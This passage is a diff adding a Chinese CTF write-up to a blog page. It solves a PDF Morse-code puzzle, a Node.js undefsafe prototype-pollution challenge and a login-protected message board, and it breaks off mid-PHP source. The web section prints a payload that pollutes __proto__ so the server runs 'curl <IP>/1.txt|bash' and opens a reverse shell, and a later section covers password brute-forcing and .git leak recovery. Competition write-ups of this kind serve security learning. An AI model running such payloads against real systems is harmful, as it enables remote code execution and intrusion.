@@ -78,7 +78,441 @@
             <a href="/blog/2021/oh-my-ctf-2021/"><h3 class="ctitle">2021 江苏理工电脑手机节-网络协会 Oh my CTF WriteUp</h3></a>
             <p><csmall>Nov 21, 2021. | By: Icing Tomato</csmall></p>
             <div class="post-content"> 
-            
+            <h1 id="游戏的开始misc">游戏的开始(MISC)</h1>
+
+<p>这道题考查对PDF文档的认识。</p>
+
+<p><img src="../../../img/2021/oh-my-ctf-2021/1.png" alt="" /></p>
+
+<h1 id="奇怪的pdfmisc">奇怪的PDF(MISC)</h1>
+
+<p>PDF隐写术</p>
+
+<p><img src="../../../img/2021/oh-my-ctf-2021/2.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-------------------------------------THERE IS THE FIRST FLAG HERE-----------------------------------------
+ABBBB BBBBA AABBB ABBBB BAAAA BBBAA BBBAA ABBBB BBBAA BBBBA BBBAA BBBBB BBBBB BBBBB
+--------------------------------------------THERE IS THE FIRST FLAG HERE-----------------------------------------
+</code></pre></div></div>
+
+<p>两个字组合想到摩斯密码，A是点，B是杠</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.---- ----. ..--- .---- -.... ---.. ---.. .---- ---.. ----. ---.. ----- ----- -----
+</code></pre></div></div>
+
+<p>所以</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>flag{19216881898000}
+</code></pre></div></div>
+
+<p>登陆站点</p>
+
+<h1 id="虎头蛇尾web">虎头蛇尾(WEB)</h1>
+
+<p>一道原型链污染的题https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940
+undefsafe函数在2.03版本下会产生漏洞
+题目源码：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">var</span> <span class="n">express</span> <span class="o">=</span> <span class="k">require</span><span class="p">(</span><span class="s1">'express'</span><span class="p">);</span>
+<span class="k">var</span> <span class="n">path</span> <span class="o">=</span> <span class="k">require</span><span class="p">(</span><span class="s1">'path'</span><span class="p">);</span>
+<span class="k">const</span> <span class="no">undefsafe</span> <span class="o">=</span> <span class="k">require</span><span class="p">(</span><span class="s1">'undefsafe'</span><span class="p">);</span>
+<span class="k">const</span> <span class="p">{</span> <span class="n">exec</span> <span class="p">}</span> <span class="o">=</span> <span class="k">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">);</span>
+
+
+<span class="k">var</span> <span class="n">app</span> <span class="o">=</span> <span class="nf">express</span><span class="p">();</span>
+<span class="kd">class</span> <span class="nc">Notes</span> <span class="p">{</span>
+    <span class="nf">constructor</span><span class="p">()</span> <span class="p">{</span>
+        <span class="n">this</span><span class="mf">.</span><span class="n">owner</span> <span class="o">=</span> <span class="s2">"whoknows"</span><span class="p">;</span>
+        <span class="n">this</span><span class="mf">.</span><span class="n">num</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">this</span><span class="mf">.</span><span class="n">note_list</span> <span class="o">=</span> <span class="p">{};</span>
+    <span class="p">}</span>
+
+    <span class="nf">write_note</span><span class="p">(</span><span class="n">author</span><span class="p">,</span> <span class="n">raw_note</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">this</span><span class="mf">.</span><span class="n">note_list</span><span class="p">[(</span><span class="n">this</span><span class="mf">.</span><span class="n">num</span><span class="o">++</span><span class="p">)</span><span class="mf">.</span><span class="nf">toString</span><span class="p">()]</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"author"</span><span class="o">:</span> <span class="n">author</span><span class="p">,</span><span class="s2">"raw_note"</span><span class="o">:</span><span class="n">raw_note</span><span class="p">};</span>
+    <span class="p">}</span>
+
+    <span class="nf">get_note</span><span class="p">(</span><span class="n">id</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">var</span> <span class="n">r</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="nf">undefsafe</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">id</span><span class="p">,</span> <span class="nf">undefsafe</span><span class="p">(</span><span class="n">this</span><span class="mf">.</span><span class="n">note_list</span><span class="p">,</span> <span class="n">id</span><span class="p">));</span>
+        <span class="k">return</span> <span class="n">r</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nf">edit_note</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="n">author</span><span class="p">,</span> <span class="n">raw</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nf">undefsafe</span><span class="p">(</span><span class="n">this</span><span class="mf">.</span><span class="n">note_list</span><span class="p">,</span> <span class="n">id</span> <span class="o">+</span> <span class="s1">'.author'</span><span class="p">,</span> <span class="n">author</span><span class="p">);</span>
+        <span class="nf">undefsafe</span><span class="p">(</span><span class="n">this</span><span class="mf">.</span><span class="n">note_list</span><span class="p">,</span> <span class="n">id</span> <span class="o">+</span> <span class="s1">'.raw_note'</span><span class="p">,</span> <span class="n">raw</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="nf">get_all_notes</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="n">this</span><span class="mf">.</span><span class="n">note_list</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nf">remove_note</span><span class="p">(</span><span class="n">id</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">delete</span> <span class="n">this</span><span class="mf">.</span><span class="n">note_list</span><span class="p">[</span><span class="n">id</span><span class="p">];</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">var</span> <span class="n">notes</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Notes</span><span class="p">();</span>
+<span class="n">notes</span><span class="mf">.</span><span class="nf">write_note</span><span class="p">(</span><span class="s2">"nobody"</span><span class="p">,</span> <span class="s2">"this is nobody's first note"</span><span class="p">);</span>
+
+
+<span class="n">app</span><span class="mf">.</span><span class="nf">set</span><span class="p">(</span><span class="s1">'views'</span><span class="p">,</span> <span class="n">path</span><span class="mf">.</span><span class="nb">join</span><span class="p">(</span><span class="n">__dirname</span><span class="p">,</span> <span class="s1">'views'</span><span class="p">));</span>
+<span class="n">app</span><span class="mf">.</span><span class="nf">set</span><span class="p">(</span><span class="s1">'view engine'</span><span class="p">,</span> <span class="s1">'pug'</span><span class="p">);</span>
+
+<span class="n">app</span><span class="mf">.</span><span class="nf">use</span><span class="p">(</span><span class="n">express</span><span class="mf">.</span><span class="nf">json</span><span class="p">());</span>
+<span class="n">app</span><span class="mf">.</span><span class="nf">use</span><span class="p">(</span><span class="n">express</span><span class="mf">.</span><span class="nf">urlencoded</span><span class="p">({</span> <span class="n">extended</span><span class="o">:</span> <span class="kc">false</span> <span class="p">}));</span>
+<span class="n">app</span><span class="mf">.</span><span class="nf">use</span><span class="p">(</span><span class="n">express</span><span class="mf">.</span><span class="k">static</span><span class="p">(</span><span class="n">path</span><span class="mf">.</span><span class="nb">join</span><span class="p">(</span><span class="n">__dirname</span><span class="p">,</span> <span class="s1">'public'</span><span class="p">)));</span>
+
+
+<span class="n">app</span><span class="mf">.</span><span class="nf">get</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="k">function</span><span class="p">(</span><span class="kt">req</span><span class="p">,</span> <span class="kt">res</span><span class="p">,</span> <span class="kt">next</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">res</span><span class="mf">.</span><span class="nf">render</span><span class="p">(</span><span class="s1">'index'</span><span class="p">,</span> <span class="p">{</span> <span class="n">title</span><span class="o">:</span> <span class="s1">'Notebook'</span> <span class="p">});</span>
+<span class="p">});</span>
+
+<span class="n">app</span><span class="mf">.</span><span class="nf">route</span><span class="p">(</span><span class="s1">'/add_note'</span><span class="p">)</span>
+    <span class="mf">.</span><span class="nf">get</span><span class="p">(</span><span class="k">function</span><span class="p">(</span><span class="kt">req</span><span class="p">,</span> <span class="kt">res</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">res</span><span class="mf">.</span><span class="nf">render</span><span class="p">(</span><span class="s1">'mess'</span><span class="p">,</span> <span class="p">{</span><span class="n">message</span><span class="o">:</span> <span class="s1">'please use POST to add a note'</span><span class="p">});</span>
+    <span class="p">})</span>
+    <span class="mf">.</span><span class="nf">post</span><span class="p">(</span><span class="k">function</span><span class="p">(</span><span class="kt">req</span><span class="p">,</span> <span class="kt">res</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">let</span> <span class="n">author</span> <span class="o">=</span> <span class="n">req</span><span class="mf">.</span><span class="n">body</span><span class="mf">.</span><span class="n">author</span><span class="p">;</span>
+        <span class="n">let</span> <span class="n">raw</span> <span class="o">=</span> <span class="n">req</span><span class="mf">.</span><span class="n">body</span><span class="mf">.</span><span class="n">raw</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">author</span> <span class="o">&amp;&amp;</span> <span class="n">raw</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">notes</span><span class="mf">.</span><span class="nf">write_note</span><span class="p">(</span><span class="n">author</span><span class="p">,</span> <span class="n">raw</span><span class="p">);</span>
+            <span class="n">res</span><span class="mf">.</span><span class="nf">render</span><span class="p">(</span><span class="s1">'mess'</span><span class="p">,</span> <span class="p">{</span><span class="n">message</span><span class="o">:</span> <span class="s2">"add note sucess"</span><span class="p">});</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="n">res</span><span class="mf">.</span><span class="nf">render</span><span class="p">(</span><span class="s1">'mess'</span><span class="p">,</span> <span class="p">{</span><span class="n">message</span><span class="o">:</span> <span class="s2">"did not add note"</span><span class="p">});</span>
+        <span class="p">}</span>
+    <span class="p">})</span>
+
+<span class="n">app</span><span class="mf">.</span><span class="nf">route</span><span class="p">(</span><span class="s1">'/edit_note'</span><span class="p">)</span>
+    <span class="mf">.</span><span class="nf">get</span><span class="p">(</span><span class="k">function</span><span class="p">(</span><span class="kt">req</span><span class="p">,</span> <span class="kt">res</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">res</span><span class="mf">.</span><span class="nf">render</span><span class="p">(</span><span class="s1">'mess'</span><span class="p">,</span> <span class="p">{</span><span class="n">message</span><span class="o">:</span> <span class="s2">"please use POST to edit a note"</span><span class="p">});</span>
+    <span class="p">})</span>
+    <span class="mf">.</span><span class="nf">post</span><span class="p">(</span><span class="k">function</span><span class="p">(</span><span class="kt">req</span><span class="p">,</span> <span class="kt">res</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">let</span> <span class="n">id</span> <span class="o">=</span> <span class="n">req</span><span class="mf">.</span><span class="n">body</span><span class="mf">.</span><span class="n">id</span><span class="p">;</span>
+        <span class="n">let</span> <span class="n">author</span> <span class="o">=</span> <span class="n">req</span><span class="mf">.</span><span class="n">body</span><span class="mf">.</span><span class="n">author</span><span class="p">;</span>
+        <span class="n">let</span> <span class="n">enote</span> <span class="o">=</span> <span class="n">req</span><span class="mf">.</span><span class="n">body</span><span class="mf">.</span><span class="n">raw</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">id</span> <span class="o">&amp;&amp;</span> <span class="n">author</span> <span class="o">&amp;&amp;</span> <span class="n">enote</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">notes</span><span class="mf">.</span><span class="nf">edit_note</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="n">author</span><span class="p">,</span> <span class="n">enote</span><span class="p">);</span>
+            <span class="n">res</span><span class="mf">.</span><span class="nf">render</span><span class="p">(</span><span class="s1">'mess'</span><span class="p">,</span> <span class="p">{</span><span class="n">message</span><span class="o">:</span> <span class="s2">"edit note sucess"</span><span class="p">});</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="n">res</span><span class="mf">.</span><span class="nf">render</span><span class="p">(</span><span class="s1">'mess'</span><span class="p">,</span> <span class="p">{</span><span class="n">message</span><span class="o">:</span> <span class="s2">"edit note failed"</span><span class="p">});</span>
+        <span class="p">}</span>
+    <span class="p">})</span>
+
+<span class="n">app</span><span class="mf">.</span><span class="nf">route</span><span class="p">(</span><span class="s1">'/delete_note'</span><span class="p">)</span>
+    <span class="mf">.</span><span class="nf">get</span><span class="p">(</span><span class="k">function</span><span class="p">(</span><span class="kt">req</span><span class="p">,</span> <span class="kt">res</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">res</span><span class="mf">.</span><span class="nf">render</span><span class="p">(</span><span class="s1">'mess'</span><span class="p">,</span> <span class="p">{</span><span class="n">message</span><span class="o">:</span> <span class="s2">"please use POST to delete a note"</span><span class="p">});</span>
+    <span class="p">})</span>
+    <span class="mf">.</span><span class="nf">post</span><span class="p">(</span><span class="k">function</span><span class="p">(</span><span class="kt">req</span><span class="p">,</span> <span class="kt">res</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">let</span> <span class="n">id</span> <span class="o">=</span> <span class="n">req</span><span class="mf">.</span><span class="n">body</span><span class="mf">.</span><span class="n">id</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">id</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">notes</span><span class="mf">.</span><span class="nf">remove_note</span><span class="p">(</span><span class="n">id</span><span class="p">);</span>
+            <span class="n">res</span><span class="mf">.</span><span class="nf">render</span><span class="p">(</span><span class="s1">'mess'</span><span class="p">,</span> <span class="p">{</span><span class="n">message</span><span class="o">:</span> <span class="s2">"delete done"</span><span class="p">});</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="n">res</span><span class="mf">.</span><span class="nf">render</span><span class="p">(</span><span class="s1">'mess'</span><span class="p">,</span> <span class="p">{</span><span class="n">message</span><span class="o">:</span> <span class="s2">"delete failed"</span><span class="p">});</span>
+        <span class="p">}</span>
+    <span class="p">})</span>
+
+<span class="n">app</span><span class="mf">.</span><span class="nf">route</span><span class="p">(</span><span class="s1">'/notes'</span><span class="p">)</span>
+    <span class="mf">.</span><span class="nf">get</span><span class="p">(</span><span class="k">function</span><span class="p">(</span><span class="kt">req</span><span class="p">,</span> <span class="kt">res</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">let</span> <span class="n">q</span> <span class="o">=</span> <span class="n">req</span><span class="mf">.</span><span class="n">query</span><span class="mf">.</span><span class="n">q</span><span class="p">;</span>
+        <span class="n">let</span> <span class="n">a_note</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nf">typeof</span><span class="p">(</span><span class="n">q</span><span class="p">)</span> <span class="o">===</span> <span class="s2">"undefined"</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">a_note</span> <span class="o">=</span> <span class="n">notes</span><span class="mf">.</span><span class="nf">get_all_notes</span><span class="p">();</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="n">a_note</span> <span class="o">=</span> <span class="n">notes</span><span class="mf">.</span><span class="nf">get_note</span><span class="p">(</span><span class="n">q</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">res</span><span class="mf">.</span><span class="nf">render</span><span class="p">(</span><span class="s1">'note'</span><span class="p">,</span> <span class="p">{</span><span class="k">list</span><span class="o">:</span> <span class="n">a_note</span><span class="p">});</span>
+    <span class="p">})</span>
+
+<span class="n">app</span><span class="mf">.</span><span class="nf">route</span><span class="p">(</span><span class="s1">'/status'</span><span class="p">)</span>
+    <span class="mf">.</span><span class="nf">get</span><span class="p">(</span><span class="k">function</span><span class="p">(</span><span class="kt">req</span><span class="p">,</span> <span class="kt">res</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">let</span> <span class="n">commands</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s2">"script-1"</span><span class="o">:</span> <span class="s2">"uptime"</span><span class="p">,</span>
+            <span class="s2">"script-2"</span><span class="o">:</span> <span class="s2">"free -m"</span>
+        <span class="p">};</span>
+        <span class="k">for</span> <span class="p">(</span><span class="n">let</span> <span class="n">index</span> <span class="n">in</span> <span class="n">commands</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nb">exec</span><span class="p">(</span><span class="n">commands</span><span class="p">[</span><span class="n">index</span><span class="p">],</span> <span class="p">{</span><span class="n">shell</span><span class="o">:</span><span class="s1">'/bin/bash'</span><span class="p">},</span> <span class="p">(</span><span class="n">err</span><span class="p">,</span> <span class="n">stdout</span><span class="p">,</span> <span class="n">stderr</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">return</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="n">console</span><span class="mf">.</span><span class="nb">log</span><span class="p">(</span><span class="sb">`stdout: ${stdout}`</span><span class="p">);</span>
+            <span class="p">});</span>
+        <span class="p">}</span>
+        <span class="n">res</span><span class="mf">.</span><span class="nf">send</span><span class="p">(</span><span class="s1">'OK'</span><span class="p">);</span>
+        <span class="n">res</span><span class="mf">.</span><span class="nb">end</span><span class="p">();</span>
+    <span class="p">})</span>
+
+
+<span class="n">app</span><span class="mf">.</span><span class="nf">use</span><span class="p">(</span><span class="k">function</span><span class="p">(</span><span class="kt">req</span><span class="p">,</span> <span class="kt">res</span><span class="p">,</span> <span class="kt">next</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">res</span><span class="mf">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span><span class="mf">.</span><span class="nf">send</span><span class="p">(</span><span class="s1">'Sorry cant find that!'</span><span class="p">);</span>
+<span class="p">});</span>
+
+
+<span class="n">app</span><span class="mf">.</span><span class="nf">use</span><span class="p">(</span><span class="k">function</span><span class="p">(</span><span class="kt">err</span><span class="p">,</span> <span class="kt">req</span><span class="p">,</span> <span class="kt">res</span><span class="p">,</span> <span class="kt">next</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">console</span><span class="mf">.</span><span class="nf">error</span><span class="p">(</span><span class="n">err</span><span class="mf">.</span><span class="n">stack</span><span class="p">);</span>
+  <span class="n">res</span><span class="mf">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">500</span><span class="p">)</span><span class="mf">.</span><span class="nf">send</span><span class="p">(</span><span class="s1">'Something broke!'</span><span class="p">);</span>
+<span class="p">});</span>
+
+
+<span class="k">const</span> <span class="no">port</span> <span class="o">=</span> <span class="mi">8080</span><span class="p">;</span>
+<span class="n">app</span><span class="mf">.</span><span class="nf">listen</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="n">console</span><span class="mf">.</span><span class="nb">log</span><span class="p">(</span><span class="sb">`Example app listening at http://localhost:${port}`</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>漏洞点在/status路由，exec导致了任意代码执行，只需要我们污染command字典。通过command字典来执行我们的命令，例如令commads.a=ls</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">app</span><span class="mf">.</span><span class="nf">route</span><span class="p">(</span><span class="s1">'/status'</span><span class="p">)</span>
+    <span class="mf">.</span><span class="nf">get</span><span class="p">(</span><span class="k">function</span><span class="p">(</span><span class="kt">req</span><span class="p">,</span> <span class="kt">res</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">let</span> <span class="n">commands</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s2">"script-1"</span><span class="o">:</span> <span class="s2">"uptime"</span><span class="p">,</span>
+            <span class="s2">"script-2"</span><span class="o">:</span> <span class="s2">"free -m"</span>
+        <span class="p">};</span>
+        <span class="k">for</span> <span class="p">(</span><span class="n">let</span> <span class="n">index</span> <span class="n">in</span> <span class="n">commands</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nb">exec</span><span class="p">(</span><span class="n">commands</span><span class="p">[</span><span class="n">index</span><span class="p">],</span> <span class="p">{</span><span class="n">shell</span><span class="o">:</span><span class="s1">'/bin/bash'</span><span class="p">},</span> <span class="p">(</span><span class="n">err</span><span class="p">,</span> <span class="n">stdout</span><span class="p">,</span> <span class="n">stderr</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">return</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="n">console</span><span class="mf">.</span><span class="nb">log</span><span class="p">(</span><span class="sb">`stdout: ${stdout}`</span><span class="p">);</span>
+            <span class="p">});</span>
+        <span class="p">}</span>
+        <span class="n">res</span><span class="mf">.</span><span class="nf">send</span><span class="p">(</span><span class="s1">'OK'</span><span class="p">);</span>
+        <span class="n">res</span><span class="mf">.</span><span class="nb">end</span><span class="p">();</span>
+    <span class="p">})</span>
+</code></pre></div></div>
+
+<p>2.传参</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">/</span><span class="n">edit_note下可以传三个参数</span><span class="err">，</span><span class="n">id</span> <span class="n">author</span> <span class="n">enote</span>
+<span class="n">app</span><span class="mf">.</span><span class="nf">route</span><span class="p">(</span><span class="s1">'/edit_note'</span><span class="p">)</span>
+    <span class="mf">.</span><span class="nf">get</span><span class="p">(</span><span class="k">function</span><span class="p">(</span><span class="kt">req</span><span class="p">,</span> <span class="kt">res</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">res</span><span class="mf">.</span><span class="nf">render</span><span class="p">(</span><span class="s1">'mess'</span><span class="p">,</span> <span class="p">{</span><span class="n">message</span><span class="o">:</span> <span class="s2">"please use POST to edit a note"</span><span class="p">});</span>
+    <span class="p">})</span>
+    <span class="mf">.</span><span class="nf">post</span><span class="p">(</span><span class="k">function</span><span class="p">(</span><span class="kt">req</span><span class="p">,</span> <span class="kt">res</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">let</span> <span class="n">id</span> <span class="o">=</span> <span class="n">req</span><span class="mf">.</span><span class="n">body</span><span class="mf">.</span><span class="n">id</span><span class="p">;</span>
+        <span class="n">let</span> <span class="n">author</span> <span class="o">=</span> <span class="n">req</span><span class="mf">.</span><span class="n">body</span><span class="mf">.</span><span class="n">author</span><span class="p">;</span>
+        <span class="n">let</span> <span class="n">enote</span> <span class="o">=</span> <span class="n">req</span><span class="mf">.</span><span class="n">body</span><span class="mf">.</span><span class="n">raw</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">id</span> <span class="o">&amp;&amp;</span> <span class="n">author</span> <span class="o">&amp;&amp;</span> <span class="n">enote</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">notes</span><span class="mf">.</span><span class="nf">edit_note</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="n">author</span><span class="p">,</span> <span class="n">enote</span><span class="p">);</span>
+            <span class="n">res</span><span class="mf">.</span><span class="nf">render</span><span class="p">(</span><span class="s1">'mess'</span><span class="p">,</span> <span class="p">{</span><span class="n">message</span><span class="o">:</span> <span class="s2">"edit note sucess"</span><span class="p">});</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="n">res</span><span class="mf">.</span><span class="nf">render</span><span class="p">(</span><span class="s1">'mess'</span><span class="p">,</span> <span class="p">{</span><span class="n">message</span><span class="o">:</span> <span class="s2">"edit note failed"</span><span class="p">});</span>
+        <span class="p">}</span>
+    <span class="p">})</span>
+</code></pre></div></div>
+
+<p>3.传入后会直接写入当前的note_list</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">class</span> <span class="nc">Notes</span> <span class="p">{</span>
+    <span class="nf">constructor</span><span class="p">()</span> <span class="p">{</span>
+        <span class="n">this</span><span class="mf">.</span><span class="n">owner</span> <span class="o">=</span> <span class="s2">"whoknows"</span><span class="p">;</span>
+        <span class="n">this</span><span class="mf">.</span><span class="n">num</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">this</span><span class="mf">.</span><span class="n">note_list</span> <span class="o">=</span> <span class="p">{};</span>
+    <span class="p">}</span>
+
+    <span class="nf">write_note</span><span class="p">(</span><span class="n">author</span><span class="p">,</span> <span class="n">raw_note</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">this</span><span class="mf">.</span><span class="n">note_list</span><span class="p">[(</span><span class="n">this</span><span class="mf">.</span><span class="n">num</span><span class="o">++</span><span class="p">)</span><span class="mf">.</span><span class="nf">toString</span><span class="p">()]</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"author"</span><span class="o">:</span> <span class="n">author</span><span class="p">,</span><span class="s2">"raw_note"</span><span class="o">:</span><span class="n">raw_note</span><span class="p">};</span>
+    <span class="p">}</span>
+
+    <span class="nf">get_note</span><span class="p">(</span><span class="n">id</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">var</span> <span class="n">r</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="nf">undefsafe</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">id</span><span class="p">,</span> <span class="nf">undefsafe</span><span class="p">(</span><span class="n">this</span><span class="mf">.</span><span class="n">note_list</span><span class="p">,</span> <span class="n">id</span><span class="p">));</span>
+        <span class="k">return</span> <span class="n">r</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nf">edit_note</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="n">author</span><span class="p">,</span> <span class="n">raw</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nf">undefsafe</span><span class="p">(</span><span class="n">this</span><span class="mf">.</span><span class="n">note_list</span><span class="p">,</span> <span class="n">id</span> <span class="o">+</span> <span class="s1">'.author'</span><span class="p">,</span> <span class="n">author</span><span class="p">);</span>
+        <span class="nf">undefsafe</span><span class="p">(</span><span class="n">this</span><span class="mf">.</span><span class="n">note_list</span><span class="p">,</span> <span class="n">id</span> <span class="o">+</span> <span class="s1">'.raw_note'</span><span class="p">,</span> <span class="n">raw</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>接受用户传参并使用，可以利用这点命令执行
+playload:`</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">id</span><span class="o">=</span><span class="nb">__proto__</span><span class="o">&amp;</span><span class="n">author</span><span class="o">=</span><span class="n">curl</span> <span class="mf">174.0.112.218</span><span class="o">/</span><span class="mf">1.</span><span class="n">txt</span><span class="o">|</span><span class="n">bash</span><span class="o">&amp;</span><span class="n">raw</span><span class="o">=</span><span class="mi">123</span>
+</code></pre></div></div>
+
+<p><img src="../../../img/2021/oh-my-ctf-2021/3.png" alt="" /></p>
+
+<p>在edit_note下传入参数，在访问status</p>
+
+<p><img src="../../../img/2021/oh-my-ctf-2021/4.png" alt="" /></p>
+
+<p>5.开个小号在内网服务器var/www/html下写一个shell文件并监听，在访问status时就会反弹shell。</p>
+
+<p><img src="../../../img/2021/oh-my-ctf-2021/5.png" alt="" /></p>
+
+<h1 id="留言板web">留言板(WEB)</h1>
+
+<p>进入题目是这样的</p>
+
+<p><img src="../../../img/2021/oh-my-ctf-2021/6.png" alt="" /></p>
+
+<p>要发帖还必须登录</p>
+
+<p><img src="../../../img/2021/oh-my-ctf-2021/7.png" alt="" /></p>
+
+<p>在这里已经给了你用户名并提示了密码；密码隐藏了后三位，我们可以用爆破爆破后面三位的方法：</p>
+
+<p><img src="../../../img/2021/oh-my-ctf-2021/8.png" alt="" /></p>
+
+<p>由爆破状态码的密码后三位为666，登录进去就可以发帖了。接下来用dirsearch扫描，发现存在.git文件
+那应该存在.git文件泄露，用GitHack下载发现有一个write_do.php，但是代码有缺失
+查一下之前提交的版本，单独用git log不能全部显示，直接用 <code class="language-plaintext highlighter-rouge">git log --all</code></p>
+
+<p><img src="../../../img/2021/oh-my-ctf-2021/9.png" alt="" /></p>
+
+<p>可以看到，head指针指向的是最早一次commit，通过<code class="language-plaintext highlighter-rouge">git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c</code> 命令将head指向第一个commit，得到完整的write_do.php</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">include</span> <span class="s2">"mysql.php"</span><span class="p">;</span>
+<span class="nb">session_start</span><span class="p">();</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'login'</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">'yes'</span><span class="p">){</span>
+    <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: ./login.php"</span><span class="p">);</span>
+    <span class="k">die</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'do'</span><span class="p">])){</span>
+<span class="k">switch</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'do'</span><span class="p">])</span>
+<span class="p">{</span>
+<span class="k">case</span> <span class="s1">'write'</span><span class="o">:</span>
+    <span class="nv">$category</span> <span class="o">=</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'category'</span><span class="p">]);</span>
+    <span class="nv">$title</span> <span class="o">=</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'title'</span><span class="p">]);</span>
+    <span class="nv">$content</span> <span class="o">=</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'content'</span><span class="p">]);</span>
+    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"insert into board
+            set category = '</span><span class="nv">$category</span><span class="s2">',
+                title = '</span><span class="nv">$title</span><span class="s2">',
